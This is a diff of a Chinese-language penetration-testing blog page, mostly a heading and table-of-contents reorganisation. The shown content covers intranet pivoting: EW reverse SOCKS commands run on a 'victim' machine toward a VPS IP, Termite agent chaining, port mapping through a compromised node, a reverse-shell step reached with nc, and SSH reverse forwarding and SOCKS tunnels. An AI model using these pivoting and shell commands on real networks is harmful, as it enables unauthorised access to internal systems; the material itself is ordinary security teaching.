@@ -147,14 +147,14 @@
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/tags/">Tags</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/tags/">Tags</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
@@ -230,12 +230,12 @@
 <p>Socks代理工具我用到的主要如下：</p>
 <p>Termite（原EW代理）</p>
 <p>EW不用说，肯定大家应该都用过，这里把原EW的简单用法和Termite的简单用法都写一下</p>
-<p>EW：</p>
+<h3 id="ew">EW</h3>
 <p>1、 VPS:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rcsocks -l 1080 -e 8888</div></pre></td></tr></table></figure>
 <p>2、 受害机</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew -s rssocks -d 112.74.201.135 -e 8888</div></pre></td></tr></table></figure>
-<p>Termite：</p>
+<h3 id="termite">Termite</h3>
 <p>1、 Server</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">agent -l 8888</div><div class="line">构建更加深的网络：</div><div class="line">已控制的主机连接进入代理网络：</div><div class="line">agent -c x.x.x.x -p 8888</div></pre></td></tr></table></figure>
 <p>2、 admin管理</p>
@@ -249,9 +249,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 2 </div><div class="line">2. lcxtran 3388 10.0.0.1 3389</div><div class="line">   以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</div><div class="line">3. 连接就只需要本地连接127.0.0.1 的3388端口</div></pre></td></tr></table></figure>
 <p>6、 Shell反弹</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. goto 1</div><div class="line">2. shell 7777</div><div class="line">   此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</div><div class="line">3. nc 127.0.0.1 7777 就是一个1号机的shell</div></pre></td></tr></table></figure>
-<p>SSH转发/socks：</p>
-<p>1、 内网主机：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">转发：</div><div class="line">1. ssh -CfNg -R 2222:127.0.0.1:22 VPS-user@VPS -p 53    //内网</div><div class="line">2. ssh -CfNg -L 8080:127.0.0.1:2222 VPS-user@VPS       //VPS</div><div class="line">本地访问VPS:8080就是内网的22端口</div><div class="line"></div><div class="line">socket代理:</div><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">在终端中运行 ssh -qTfnN -D 6080 user@theserver ，然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.</div></pre></td></tr></table></figure>
+<h3 id="ssh">SSH</h3>
+<h4 id="转发">转发</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. ssh -CfNg -R 2222:127.0.0.1:22 VPS-user@VPS -p 53    //内网</div><div class="line">2. ssh -CfNg -L 8080:127.0.0.1:2222 VPS-user@VPS       //VPS</div><div class="line">本地访问VPS:8080就是内网的22端口</div></pre></td></tr></table></figure>
+<h4 id="socket代理">socket代理</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">在终端中运行 ssh -qTfnN -D 6080 user@theserver ，然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.</div></pre></td></tr></table></figure>
                 
 
                 <hr>
@@ -290,7 +292,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-引言"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0x00 引言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-端口转发"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">0x01 端口转发</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-工具"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">0x02 工具</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-引言"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0x00 引言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-端口转发"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">0x01 端口转发</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-工具"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">0x02 工具</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ew"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">EW</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#termite"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">Termite</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ssh"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">SSH</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#转发"><span class="toc-nav-number">3.3.1.</span> <span class="toc-nav-text">转发</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#socket代理"><span class="toc-nav-number">3.3.2.</span> <span class="toc-nav-text">socket代理</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
